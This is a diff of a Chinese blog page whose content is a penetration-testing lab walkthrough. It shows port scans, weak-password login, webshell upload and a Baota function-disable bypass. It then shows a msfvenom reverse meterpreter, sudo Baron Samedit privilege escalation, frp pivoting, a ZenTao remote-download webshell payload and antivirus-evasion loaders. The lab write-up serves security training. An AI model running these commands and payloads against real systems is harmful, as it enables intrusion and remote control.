@@ -78,8 +78,8 @@
 <meta property="article:published_time" content="2023-07-09T05:14:00.000Z">
 <meta property="article:modified_time" content="2023-10-10T05:14:00.000Z">
 <meta property="article:author" content="BadWolf">
-<meta property="article:tag" content="靶场">
 <meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://s2.loli.net/2022/08/08/Wr5pUhkbyRF91AD.png">
   
@@ -131,7 +131,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/common/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -400,111 +400,111 @@
 <p>修改ens33dhcp获取IP,修改BOOTPROTO&#x3D;DHCP，删除IPADDR,NETMASK</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>sysconfig<span class="hljs-regexp">/network-scripts/i</span>fcfg-ens33<br>systemctl  restart  network<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/Wr5pUhkbyRF91AD.png" srcset="/img/loading.gif" lazyload alt="image-20220324215249220"></p>
+<p><img src="https://s2.loli.net/2022/08/08/Wr5pUhkbyRF91AD.png" srcset="/img/common/loading.gif" lazyload alt="image-20220324215249220"></p>
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>端口扫描</strong></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT -T4 -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.56.129</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/04/08/KIWRzYMmSnFTOoy.png" srcset="/img/loading.gif" lazyload alt="image-20220324215730638"></p>
+<p><img src="https://s2.loli.net/2022/04/08/KIWRzYMmSnFTOoy.png" srcset="/img/common/loading.gif" lazyload alt="image-20220324215730638"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sC -T4 -p <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">81</span>,<span class="hljs-number">888</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8888</span> <span class="hljs-number">192.168.56.129</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/04/08/qhYksjIyStplM4O.png" srcset="/img/loading.gif" lazyload alt="image-20220324215923631"></p>
+<p><img src="https://s2.loli.net/2022/04/08/qhYksjIyStplM4O.png" srcset="/img/common/loading.gif" lazyload alt="image-20220324215923631"></p>
 <p>8888端口明显是宝塔后台框架</p>
-<p><img src="https://s2.loli.net/2022/04/08/P3ObSzNpJQqFBrw.png" srcset="/img/loading.gif" lazyload alt="image-20220324215908035"></p>
+<p><img src="https://s2.loli.net/2022/04/08/P3ObSzNpJQqFBrw.png" srcset="/img/common/loading.gif" lazyload alt="image-20220324215908035"></p>
 <p>访问81端口，发现极致cms建站系统</p>
-<p><img src="https://s2.loli.net/2022/04/08/7Af2LM5SsZmEG6B.png" srcset="/img/loading.gif" lazyload alt="image-20220324220628871"></p>
+<p><img src="https://s2.loli.net/2022/04/08/7Af2LM5SsZmEG6B.png" srcset="/img/common/loading.gif" lazyload alt="image-20220324220628871"></p>
 <p><strong>目录扫描</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.129</span>: -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>fuzzDicts<span class="hljs-regexp">/directoryDicts/</span>Filenames_or_Directories_All.txt<br></code></pre></td></tr></table></figure>
 
 <p>在readme.txt中发现历史版本信息，推测本版本信息为极致CMSBetal.8.1</p>
-<p><img src="https://s2.loli.net/2022/04/08/Vyw82uDJF7I9B4N.png" srcset="/img/loading.gif" lazyload alt="image-20220324220909187"></p>
+<p><img src="https://s2.loli.net/2022/04/08/Vyw82uDJF7I9B4N.png" srcset="/img/common/loading.gif" lazyload alt="image-20220324220909187"></p>
 <p>访问admin.php</p>
 <p>简单爆破一下弱密码</p>
-<p><img src="https://s2.loli.net/2022/04/08/PaLyX18iChKGg6V.png" srcset="/img/loading.gif" lazyload alt="image-20220406093307203">admin&#x2F;admin123登陆到后台</p>
+<p><img src="https://s2.loli.net/2022/04/08/PaLyX18iChKGg6V.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406093307203">admin&#x2F;admin123登陆到后台</p>
 <h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>极致历史漏洞中，有一个后台getshell</p>
 <p>安装在线模板插件</p>
-<p><img src="https://s2.loli.net/2022/04/08/2cgmGwlI8ZTWQtH.png" srcset="/img/loading.gif" lazyload alt="image-20220406095130637"></p>
+<p><img src="https://s2.loli.net/2022/04/08/2cgmGwlI8ZTWQtH.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406095130637"></p>
 <p>选择配置</p>
-<p><img src="https://s2.loli.net/2022/04/08/t4o8iTFc75E6mub.png" srcset="/img/loading.gif" lazyload alt="image-20220406095240031"></p>
+<p><img src="https://s2.loli.net/2022/04/08/t4o8iTFc75E6mub.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406095240031"></p>
 <p>随便输入密码</p>
-<p><img src="https://s2.loli.net/2022/04/08/RKCOZ3E19dcsf4F.png" srcset="/img/loading.gif" lazyload alt="image-20220406095304724">再次点击配置输入密码，会进入后台文件编辑</p>
-<p><img src="https://s2.loli.net/2022/04/08/jEbzIPTF6lC2q3W.png" srcset="/img/loading.gif" lazyload alt="image-20220406095447340"></p>
+<p><img src="https://s2.loli.net/2022/04/08/RKCOZ3E19dcsf4F.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406095304724">再次点击配置输入密码，会进入后台文件编辑</p>
+<p><img src="https://s2.loli.net/2022/04/08/jEbzIPTF6lC2q3W.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406095447340"></p>
 <p>写入一句话木马，蚁剑连接即可</p>
-<p><img src="https://s2.loli.net/2022/04/08/Xl39rkI2iYa85QD.png" srcset="/img/loading.gif" lazyload alt="image-20220406095741870"></p>
+<p><img src="https://s2.loli.net/2022/04/08/Xl39rkI2iYa85QD.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406095741870"></p>
 <p>同时也发现了数据库用户密码</p>
-<p><img src="https://s2.loli.net/2022/04/08/clj7IWBRZsNLE6v.png" srcset="/img/loading.gif" lazyload alt="image-20220406100612913"></p>
+<p><img src="https://s2.loli.net/2022/04/08/clj7IWBRZsNLE6v.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406100612913"></p>
 <h3 id="禁用函数绕过"><a href="#禁用函数绕过" class="headerlink" title="禁用函数绕过"></a>禁用函数绕过</h3><p>蚁剑连接之后，想执行命令，发现直接ret&#x3D;127，不能执行命令，</p>
 <p>这里猜想</p>
 <p>应该是对用户访问目录权限进行了限制和php，disable_functions禁用了一些函数，写入php测试语句查看禁用了哪些函数</p>
-<p><img src="https://s2.loli.net/2022/04/08/ni1JG6o49mLC3zW.png" srcset="/img/loading.gif" lazyload alt="image-20220406101501645"></p>
+<p><img src="https://s2.loli.net/2022/04/08/ni1JG6o49mLC3zW.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406101501645"></p>
 <p>宝塔禁用函数，直接使用蚁剑插件就可以bypass</p>
-<p><img src="https://s2.loli.net/2022/04/08/ClhRT7qYOHFXuDs.png" srcset="/img/loading.gif" lazyload alt="image-20220406101050509"></p>
-<p><img src="https://s2.loli.net/2022/04/08/9VOs1C8JtucbFeq.png" srcset="/img/loading.gif" lazyload alt="image-20220406101101179"></p>
+<p><img src="https://s2.loli.net/2022/04/08/ClhRT7qYOHFXuDs.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406101050509"></p>
+<p><img src="https://s2.loli.net/2022/04/08/9VOs1C8JtucbFeq.png" srcset="/img/common/loading.gif" lazyload alt="image-20220406101101179"></p>
 <h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>生成反向马</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.56.105 <span class="hljs-attribute">LPORT</span>=6666 -f elf&gt;reverse_6666.elf<br></code></pre></td></tr></table></figure>
 
 <p>msf监听</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp <br><span class="hljs-built_in">set</span> lport 6666<br><span class="hljs-built_in">set</span> lhost 192.168.56.105<br>options<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/oJT2AQdntg6qBUz.png" srcset="/img/loading.gif" lazyload alt="image-20220516172605317"></p>
+<p><img src="https://s2.loli.net/2022/08/08/oJT2AQdntg6qBUz.png" srcset="/img/common/loading.gif" lazyload alt="image-20220516172605317"></p>
 <p>查看网卡信息，发现域内IP</p>
-<p><img src="https://s2.loli.net/2022/08/08/1XUwe4jKMuFq7Cv.png" srcset="/img/loading.gif" lazyload alt="image-20220516192214396"></p>
+<p><img src="https://s2.loli.net/2022/08/08/1XUwe4jKMuFq7Cv.png" srcset="/img/common/loading.gif" lazyload alt="image-20220516192214396"></p>
 <h3 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h3><p><strong>设置路由转发</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">msf6&gt;</span><span class="language-bash">route</span><br><span class="hljs-meta prompt_">msf6&gt;</span><span class="language-bash">use post/multi/manage/autoroute</span><br><span class="hljs-meta prompt_">msf6&gt;</span><span class="language-bash">sessions 1</span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">run post/multi/manage/autoroute</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/e54PnmHITM7J3V6.png" srcset="/img/loading.gif" lazyload alt="image-20220516193934459"></p>
+<p><img src="https://s2.loli.net/2022/08/08/e54PnmHITM7J3V6.png" srcset="/img/common/loading.gif" lazyload alt="image-20220516193934459"></p>
 <p><strong>设置sock5代理</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">msf6&gt;</span><span class="language-bash">use auxiliary/server/socks_proxy</span> <br><span class="hljs-meta prompt_">msf6&gt;</span><span class="language-bash">exploit</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/kXnt4goDWZSrchL.png" srcset="/img/loading.gif" lazyload alt="image-20220516194246705"></p>
+<p><img src="https://s2.loli.net/2022/08/08/kXnt4goDWZSrchL.png" srcset="/img/common/loading.gif" lazyload alt="image-20220516194246705"></p>
 <h3 id="centos提权"><a href="#centos提权" class="headerlink" title="centos提权"></a>centos提权</h3><p>升级为交互式shell</p>
 <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/script -qc /</span>bin<span class="hljs-regexp">/bash /</span>dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/BTzvO8oHAGyYjum.png" srcset="/img/loading.gif" lazyload alt="image-20220516235522690"></p>
+<p><img src="https://s2.loli.net/2022/08/08/BTzvO8oHAGyYjum.png" srcset="/img/common/loading.gif" lazyload alt="image-20220516235522690"></p>
 <p>上传漏洞检测脚本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.56.105:8000/linux-exploit-suggester.sh<br><span class="hljs-built_in">chmod</span> 777 ./linux-exploit-suggester.sh<br>./linux-exploit-suggester.sh<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/YIhiDPV5ojXgF2q.png" srcset="/img/loading.gif" lazyload alt="image-20220516235900535"></p>
+<p><img src="https://s2.loli.net/2022/08/08/YIhiDPV5ojXgF2q.png" srcset="/img/common/loading.gif" lazyload alt="image-20220516235900535"></p>
 <p>使用<code>[CVE-2021-3156] sudo Baron Samedit</code>漏洞</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">msf&gt;</span><span class="language-bash">use exploit/linux/local/sudo_baron_samedit</span><br><span class="hljs-meta prompt_">msf&gt;</span><span class="language-bash"><span class="hljs-built_in">set</span> session 1</span><br></code></pre></td></tr></table></figure>
 
 <p>查看sudo和libc环境</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo -V<br>ldd <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/HDF4jTuOVECcw3o.png" srcset="/img/loading.gif" lazyload alt="image-20220517001619521"></p>
+<p><img src="https://s2.loli.net/2022/08/08/HDF4jTuOVECcw3o.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517001619521"></p>
 <p>设置目标环境，选择target12获得交互式终端</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">msf&gt;</span><span class="language-bash">show targets</span><br><span class="hljs-meta prompt_">msf&gt;</span><span class="language-bash"><span class="hljs-built_in">set</span> target 12</span><br><span class="hljs-meta prompt_">msf&gt;</span><span class="language-bash">run</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/qPtBSCLHwgTlXuF.png" srcset="/img/loading.gif" lazyload alt="image-20220517001131869"></p>
+<p><img src="https://s2.loli.net/2022/08/08/qPtBSCLHwgTlXuF.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517001131869"></p>
 <p>用户msf创建成功但并未成功返回session，但可以直接远程登录<code>msf</code>用户<code>vgkbqftgycwpjcs</code>且权限为root。</p>
-<p><img src="https://s2.loli.net/2022/08/08/xDAB7POlIwgeV6b.png" srcset="/img/loading.gif" lazyload alt="image-20220517001656920"></p>
-<p><img src="https://s2.loli.net/2022/08/08/6uwlZQJz2LCmNEa.png" srcset="/img/loading.gif" lazyload alt="image-20220517001907630"></p>
+<p><img src="https://s2.loli.net/2022/08/08/xDAB7POlIwgeV6b.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517001656920"></p>
+<p><img src="https://s2.loli.net/2022/08/08/6uwlZQJz2LCmNEa.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517001907630"></p>
 <p>重新运行reverse_6666_x64.elf，反弹session，注意首先需要将msf路由断开，或退出原终端，才能成功连接。</p>
-<p><img src="https://s2.loli.net/2022/08/08/OKf4tHLSvNCYPgX.png" srcset="/img/loading.gif" lazyload alt="image-20220517002354030"></p>
+<p><img src="https://s2.loli.net/2022/08/08/OKf4tHLSvNCYPgX.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517002354030"></p>
 <h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>使用<code>auxiliary/scanner/portscan/tcp</code>模块扫描内网</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> rhost <span class="hljs-number">10.0.20.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">set</span> ports <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">8080</span><br><span class="hljs-attribute">set</span> threads <span class="hljs-number">30</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/QEkmLFW7Zy3tcKl.png" srcset="/img/loading.gif" lazyload alt="image-20220517104536496"></p>
+<p><img src="https://s2.loli.net/2022/08/08/QEkmLFW7Zy3tcKl.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517104536496"></p>
 <p>发现10.0.20.66主机，开放8080端口，访问，是禅道oa</p>
-<p><img src="https://s2.loli.net/2022/08/08/PIOnHh9FjbqvDwQ.png" srcset="/img/loading.gif" lazyload alt="image-20220517104935030"></p>
+<p><img src="https://s2.loli.net/2022/08/08/PIOnHh9FjbqvDwQ.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517104935030"></p>
 <p>禅道CMS，检查版本</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.0.20.66:8080/index.php?mode=getconfig</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/c817b56a61de4bc1b0d3848f2eef8123.png" srcset="/img/loading.gif" lazyload alt="image-20220517121624584"></p>
+<p><img src="https://img-blog.csdnimg.cn/c817b56a61de4bc1b0d3848f2eef8123.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517121624584"></p>
 <p>demo账号登陆可以看到禅道版本信息</p>
-<p><img src="https://s2.loli.net/2022/08/08/RMPNcjTrKzxlEe9.png" srcset="/img/loading.gif" lazyload alt="image-20220517110637094"></p>
+<p><img src="https://s2.loli.net/2022/08/08/RMPNcjTrKzxlEe9.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517110637094"></p>
 <h3 id="frp代理"><a href="#frp代理" class="headerlink" title="frp代理"></a>frp代理</h3><p>msf代理在蚁剑的地方，上传大一点的文件经常会报错，所以使用frp代理稳定一点</p>
 <p><strong>服务器端：</strong></p>
 <p>在kali运行服务端frps，frps.ini配置文件为</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_ip</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span>   <span class="hljs-comment">#kali IP，为与客户端绑定的进行通讯的地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure>
 
 <p>前台启动：<code>./frps -c ./frps.ini</code> 后台启动：<code>nohup ./frps -c ./frps.ini &amp;</code></p>
-<p><img src="https://s2.loli.net/2022/08/08/rPlx64qpdVIksc1.png" srcset="/img/loading.gif" lazyload alt="image-20220517115911129"></p>
+<p><img src="https://s2.loli.net/2022/08/08/rPlx64qpdVIksc1.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517115911129"></p>
 <p><strong>客户端：</strong></p>
 <p>在受害机运行客户端frc，frps.ini配置文件为</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span> <span class="hljs-comment">#服务端的IP地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>           <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> =<span class="hljs-number">8888</span>            <span class="hljs-comment">#socks端口</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>
 
 <p>前台启动：<code>./frpc -c ./frpc.ini</code> 后台启动：<code>nohup ./frpc -c ./frpc.ini &amp;</code></p>
-<p><img src="https://s2.loli.net/2022/08/08/ZOSrMmQqYwN7zAC.png" srcset="/img/loading.gif" lazyload alt="image-20220517121046202"></p>
+<p><img src="https://s2.loli.net/2022/08/08/ZOSrMmQqYwN7zAC.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517121046202"></p>
 <h3 id="文件上传getshell"><a href="#文件上传getshell" class="headerlink" title="文件上传getshell"></a>文件上传getshell</h3><p>代理frp流量访问8080端口，<code>admin/Admin123</code>进入后台</p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/315393148">禅道12.4.2后台管理员权限Getshell</a></p>
 <p>将木马写入第一层centos中，开启http服务</p>
@@ -519,27 +519,27 @@
 <p>发现因为是IIS部署的直接解析文件，发现该html文件不存在</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.0</span>.<span class="hljs-number">20.66</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/data/</span>client<span class="hljs-regexp">/1/</span>shell.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/W2mNnpiLrkKJCfa.png" srcset="/img/loading.gif" lazyload alt="image-20220517130015150"></p>
+<p><img src="https://s2.loli.net/2022/08/08/W2mNnpiLrkKJCfa.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517130015150"></p>
 <p>更换payload</p>
 <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://10.0.20.66:8080/<span class="hljs-keyword">index</span>.php?m=client<span class="hljs-variable">&amp;f</span>=download<span class="hljs-variable">&amp;version</span>=1<span class="hljs-variable">&amp;link</span>=SFRUUDovLzEwLjAuMjAuMzA6ODAwMC9zaGVsbC5waHAjCg==<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/s6xeNGVpuoXUZEP.png" srcset="/img/loading.gif" lazyload alt="image-20220517130658448"></p>
+<p><img src="https://s2.loli.net/2022/08/08/s6xeNGVpuoXUZEP.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517130658448"></p>
 <p>如果出现访问路径问题，可在http路径上添加#，重复以上操作，原因未知。</p>
-<p><img src="https://s2.loli.net/2022/08/08/pC6JsdTMSK5XYAZ.png" srcset="/img/loading.gif" lazyload alt="image-20220517130804817"></p>
+<p><img src="https://s2.loli.net/2022/08/08/pC6JsdTMSK5XYAZ.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517130804817"></p>
 <p>如果显示下载成功，但shell.php无内容的话，这是因为后端获取文件时，会先扫描目录是否有同名文件，如果存在直接显示下载成功，会从url中获取文件名shell.php并创建空白文件，访问连接后，获取内容再写入文件。但是，如果连接获取失败，空白文件shell.php不会被删除，在下次上传文件时，会直接显示下载成功，不会访问url。</p>
-<p><img src="https://s2.loli.net/2022/08/08/gJUHBEtALFoOcC9.png" srcset="/img/loading.gif" lazyload alt="image-20220518102511190"></p>
+<p><img src="https://s2.loli.net/2022/08/08/gJUHBEtALFoOcC9.png" srcset="/img/common/loading.gif" lazyload alt="image-20220518102511190"></p>
 <p>蚁剑连接即可</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.0</span>.<span class="hljs-number">20.66</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/data/</span>client<span class="hljs-regexp">/1/</span>shell.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/H9B3uF8IosaC67p.png" srcset="/img/loading.gif" lazyload alt="image-20220517140207088"></p>
+<p><img src="https://s2.loli.net/2022/08/08/H9B3uF8IosaC67p.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517140207088"></p>
 <h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p><strong>检测杀毒软件</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /svc<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/MXu5xo24kq7fzRc.png" srcset="/img/loading.gif" lazyload alt="image-20220517140526449"></p>
+<p><img src="https://s2.loli.net/2022/08/08/MXu5xo24kq7fzRc.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517140526449"></p>
 <p>将结果放到网站进行杀软查杀</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>payloads.net<span class="hljs-regexp">/kill_software/</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/08/08/VmGhdDw5spTk7CN.png" srcset="/img/loading.gif" lazyload alt="image-20220517140709911"></p>
+<p><img src="https://s2.loli.net/2022/08/08/VmGhdDw5spTk7CN.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517140709911"></p>
 <p>存在火绒，准备火绒免杀。</p>
 <h3 id="火绒免杀"><a href="#火绒免杀" class="headerlink" title="火绒免杀"></a>火绒免杀</h3><p><strong>下载gsl加载器</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/TideSec/</span>BypassAntiVirus<span class="hljs-regexp">/master/</span>tools/gsl-sc-loader.zip<br></code></pre></td></tr></table></figure>
@@ -557,44 +557,44 @@
 <h3 id="域主机提权"><a href="#域主机提权" class="headerlink" title="域主机提权"></a>域主机提权</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="language-bash"> post/multi/recon/local_exploit_suggester</span><br></code></pre></td></tr></table></figure>
 
 <p>建议多跑几次o((&gt;ω&lt; ))o，一次可能不准确</p>
-<p><img src="https://s2.loli.net/2022/08/08/OTgBAZ2CPy1zfxH.png" srcset="/img/loading.gif" lazyload alt="image-20220517145103021"></p>
+<p><img src="https://s2.loli.net/2022/08/08/OTgBAZ2CPy1zfxH.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517145103021"></p>
